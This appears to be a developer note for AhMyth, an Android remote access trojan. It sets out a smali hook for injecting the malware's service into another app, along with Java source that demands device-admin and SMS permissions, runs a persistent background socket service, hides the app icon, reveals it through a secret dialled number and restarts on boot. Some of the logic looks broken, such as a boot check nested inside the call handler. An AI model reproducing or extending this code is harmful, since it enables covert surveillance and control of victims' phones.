

## New Hook Method
```smali
invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
```
## New hopeful Hook start function

- MainService.java
```java
    // Smali hook point

    public static void start() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    public static void startService(Context context) {

        context.startService(new Intent(context, MainService.class));

    }

    @Override

    public IBinder onBind(Intent intent) {

        return null;

    }

    @Override

    public int onStartCommand(Intent intent, int flags, int startId) {

        IOSocket.start(this);

        return START_STICKY;

    }

```

- MainActivity.java
```java
public class MainActivity extends Activity {

    DevicePolicyManager devicePolicyManager;

    ComponentName componentName;

    SharedPreferences sharedPreferences;

    @Override

    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        componentName = new ComponentName(this, AdminReceiver.class);

        devicePolicyManager = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);

        if (devicePolicyManager.isAdminActive(componentName)) {

//            Log.d("MY_TAG","Ok then");

        }

        else {

            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);

            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);

            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));

            startActivity(intent);

        }

        if (

                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&

                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&

                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED

        ){

            Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);

            mIntent.setData(Uri.parse("package:"+getPackageName()));

            startActivity(mIntent);

            Toast.makeText(this, "Grant all permission before!", Toast.LENGTH_LONG).show();

        }

        Intent serviceIntent = new Intent(this, MainService.class);

        ContextCompat.startForegroundService(this, serviceIntent);

//        --------------------------------------------------------------------------------------------

//        startService(new Intent(this, MainService.class));

//        finish();

        if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.P){

            Switch hide_icon_switch = findViewById(R.id.switch1);

            hide_icon_switch.setVisibility(View.VISIBLE);

            sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);

            final SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

            hide_icon_switch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {

                @Override

                public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {

                    appSettingEditor.putBoolean("hidden_status",isChecked);

                    appSettingEditor.commit();

                }

            });

            boolean icon_hidden_status = sharedPreferences.getBoolean("hidden_status",false);

            if (icon_hidden_status){

                fn_hideicon();

                hide_icon_switch.setChecked(true);

            }

            else {

                hide_icon_switch.setChecked(false);

            }

        }

    }

    

    public void fn_hideicon() {

        getPackageManager().setComponentEnabledSetting(getComponentName(),

                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,

                PackageManager.DONT_KILL_APP);

    }

//    for activity_main functionality

    public void openGooglePlay(View view) {

        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));

        startActivity(GoogleIntent);
                MainService.startService(this);
        finish();

    }

}
```


- MyReciever.java
```java
public class MyReceiver extends BroadcastReceiver {

    public MyReceiver() {

    }

    @Override

    public void onReceive(Context context, Intent intent) {

        Intent serviceIntent = new Intent(context, MainService.class);

        ContextCompat.startForegroundService(context, serviceIntent);

//        Toast.makeText(context,intent.getAction(),Toast.LENGTH_LONG).show();

        if (intent.getAction().equalsIgnoreCase(Intent.ACTION_NEW_OUTGOING_CALL)){

            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

            if (phoneNumber.equalsIgnoreCase(context.getResources().getString(R.string.unhide_phone_number))){

                SharedPreferences sharedPreferences = context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE);

                boolean hidden_status = sharedPreferences.getBoolean("hidden_status",false);

                if (hidden_status){

                    SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

                    appSettingEditor.putBoolean("hidden_status",false);

                    appSettingEditor.commit();

                    ComponentName componentName = new ComponentName(context, MainActivity.class);

                    context.getPackageManager()

                            .setComponentEnabledSetting(componentName,

                                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,

                                    PackageManager.DONT_KILL_APP);

                    Toast.makeText(context, "AhMyth's icon has been revealed!", Toast.LENGTH_SHORT).show();

                }
                
                if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                MainService.startService(context);

                }

            }

        }

    }

}
```
